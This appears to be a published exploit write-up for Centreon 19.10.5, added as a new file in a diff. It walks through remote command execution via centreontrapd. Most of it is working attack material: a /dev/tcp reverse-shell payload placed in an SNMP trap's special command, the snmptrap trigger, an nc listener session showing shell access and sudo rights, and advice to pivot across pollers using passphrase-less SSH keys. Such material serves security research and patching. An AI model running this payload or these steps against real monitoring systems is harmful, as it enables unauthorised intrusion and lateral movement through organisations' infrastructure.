@@ -1,0 +1,160 @@
+# Exploit Title: Centreon 19.10.5 - 'centreontrapd' Remote Command Execution 
+# Date: 2020-01-29
+# Exploit Author: Fabien AUNAY, Omri Baso
+# Vendor Homepage: https://www.centreon.com/
+# Software Link: https://github.com/centreon/centreon
+# Version: 19.10.5
+# Tested on: CentOS 7
+# CVE : -
+
+###########################################################################################################
+Centreon 19.10.5 Remote Command Execution centreontrapd
+
+Trusted by SMBs and Fortune 500 companies worldwide.
+An industry reference in IT Infrastructure monitoring for the enterprise.
+Counts 200,000+ ITOM users worldwide and an international community of software collaborators.
+Presence in Toronto and Luxembourg.
+Deployed in diverse sectors:
+- IT & telecommunication
+- Transportation
+- Government
+- Heath care
+- Retail
+- Utilities
+- Finance & Insurance
+- Aerospace & Defense
+- Manufacturing
+- etc.
+
+It is possible to get a reverse shell with a snmp trap and gain a pivot inside distributed architecture.
+
+
+Steps:
+Objective 1 : Create a SNMP trap or use linkDown OID with special command in action 3
+Objective 2 : Create passive service and use App-Monitoring-Centreon-Service-Dummy
+Objective 3 : Assign service trap relation
+Objective 4 : Get centreon id reverse shell
+
+###########################################################################################################
+
+# Objective 1 : Create or use SNMP trap OID with special command in action 3
+- Configuration  >  SNMP Traps
+
+[+] Trap name *     : linkDown
+[+] OID *        : .1.3.6.1.6.3.1.1.5.3
+[+] Special Command    : 0<&121-;exec 121<>/dev/tcp/127.0.0.1/12345;sh <&121 >&121 2>&121
+
+
+# Objective 2 : Create passive service and use App-Monitoring-Centreon-Service-Dummy
+- Configuration  >  Services  >  Services by host
+
+[+] Description *        : TRAP RCE
+[+] Linked with Hosts *        : YOUR-LINKED-HOST
+[+] Check Command *        : App-Monitoring-Centreon-Service-Dummy
+[+] DUMMYSTATUS            : 0
+[+] DUMMYOUTPUT            : 0
+[+] Passive Checks Enabled     : YES
+[+] Is Volatile            : YES
+[+] Service Trap Relation    : Generic - linkDown
+
+
+# Objective 3 : Assign service trap relation
+- Configuration  >  SNMP Traps
+- linkDown
+- Relations
+
+[+] Linked services        : YOUR-LINKED-HOST - SERVICE DESCRIPTION
+
+reload Central
+Reload snmp config
+
+
+# Objective 4 : Get centreon id reverse shell and think lateral
+
+[+] Send your trap
+snmptrap -v2c -c public 127.0.0.1 '' .1.3.6.1.6.3.1.1.5.3 ifIndex i 1 ifadminStatus i 2 ifOperStatus i 2
+
+TIP: centreontrapd logfile:
+2020-01-29 02:52:33 - DEBUG - 340 - Reading trap.  Current time: Wed Jan 29 02:52:33 2020
+2020-01-29 02:52:33 - DEBUG - 340 - Symbolic trap variable name detected (DISMAN-EVENT-MIB::sysUpTimeInstance).  Will attempt to translate to a numerical OID
+2020-01-29 02:52:33 - DEBUG - 340 -   Translated to .1.3.6.1.2.1.1.3.0
+2020-01-29 02:52:33 - DEBUG - 340 - Symbolic trap variable name detected (SNMPv2-MIB::snmpTrapOID.0).  Will attempt to translate to a numerical OID
+...
+2020-01-29 02:52:33 - DEBUG - 340 - Trap found on service 'TRAP RCE' for host 'supervision_IT'.
+...
+2020-01-29 02:52:43 - INFO - 1757 - EXEC: Launch specific command
+2020-01-29 02:52:43 - INFO - 1757 - EXEC: Launched command: 0<&121-;exec 121<>/dev/tcp/127.0.0.1/12345;sh <&121 >&121 2>&121
+..
+
+
+NOTE: Read the doc !!!
+https://documentation-fr.centreon.com/docs/centreon/fr/latest/administration_guide/poller/ssh_key.html?highlight=keygen
+
+The centreon id user shares configurations and instructions with satellite collectors trough SSH.
+No passphrase used.
+This allows you to move around the infrastructure after your RCE.
+
+
+POC:
+
+snmptrap -v2c -c public 127.0.0.1 '' .1.3.6.1.6.3.1.1.5.3 ifIndex i 1 ifadminStatus i 2 ifOperStatus i 2
+
+nc -lvnp 12345
+Ncat: Version 7.50
+Ncat: Listening on :::12345
+Ncat: Listening on 0.0.0.0:12345
+Ncat: Connection from 127.0.0.1.
+Ncat: Connection from 127.0.0.1:38470.
+id
+uid=997(centreon) gid=994(centreon) groups=994(centreon),48(apache),990(centreon-engine),992(centreon-broker)
+sudo -l
+Matching Defaults entries for centreon on centreonlab:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin, !requiretty
+
+User centreon may run the following commands on centreonlab:
+    (root) NOPASSWD: /sbin/service centreontrapd start
+    (root) NOPASSWD: /sbin/service centreontrapd stop
+    (root) NOPASSWD: /sbin/service centreontrapd restart
+    (root) NOPASSWD: /sbin/service centreontrapd reload
+    (root) NOPASSWD: /usr/sbin/service centreontrapd start
+    (root) NOPASSWD: /usr/sbin/service centreontrapd stop
+    (root) NOPASSWD: /usr/sbin/service centreontrapd restart
+    (root) NOPASSWD: /usr/sbin/service centreontrapd reload
+    (root) NOPASSWD: /sbin/service centengine start
+    (root) NOPASSWD: /sbin/service centengine stop
+    (root) NOPASSWD: /sbin/service centengine restart
+    (root) NOPASSWD: /sbin/service centengine reload
+    (root) NOPASSWD: /usr/sbin/service centengine start
+    (root) NOPASSWD: /usr/sbin/service centengine stop
+    (root) NOPASSWD: /usr/sbin/service centengine restart
+    (root) NOPASSWD: /usr/sbin/service centengine reload
+    (root) NOPASSWD: /bin/systemctl start centengine
+    (root) NOPASSWD: /bin/systemctl stop centengine
+    (root) NOPASSWD: /bin/systemctl restart centengine
+    (root) NOPASSWD: /bin/systemctl reload centengine
+    (root) NOPASSWD: /usr/bin/systemctl start centengine
+    (root) NOPASSWD: /usr/bin/systemctl stop centengine
+    (root) NOPASSWD: /usr/bin/systemctl restart centengine
+    (root) NOPASSWD: /usr/bin/systemctl reload centengine
+    (root) NOPASSWD: /sbin/service cbd start
+    (root) NOPASSWD: /sbin/service cbd stop
+    (root) NOPASSWD: /sbin/service cbd restart
+    (root) NOPASSWD: /sbin/service cbd reload
+    (root) NOPASSWD: /usr/sbin/service cbd start
+    (root) NOPASSWD: /usr/sbin/service cbd stop
+    (root) NOPASSWD: /usr/sbin/service cbd restart
+    (root) NOPASSWD: /usr/sbin/service cbd reload
+    (root) NOPASSWD: /bin/systemctl start cbd
+    (root) NOPASSWD: /bin/systemctl stop cbd
+    (root) NOPASSWD: /bin/systemctl restart cbd
+    (root) NOPASSWD: /bin/systemctl reload cbd
+    (root) NOPASSWD: /usr/bin/systemctl start cbd
+    (root) NOPASSWD: /usr/bin/systemctl stop cbd
+    (root) NOPASSWD: /usr/bin/systemctl restart cbd
+    (root) NOPASSWD: /usr/bin/systemctl reload cbd
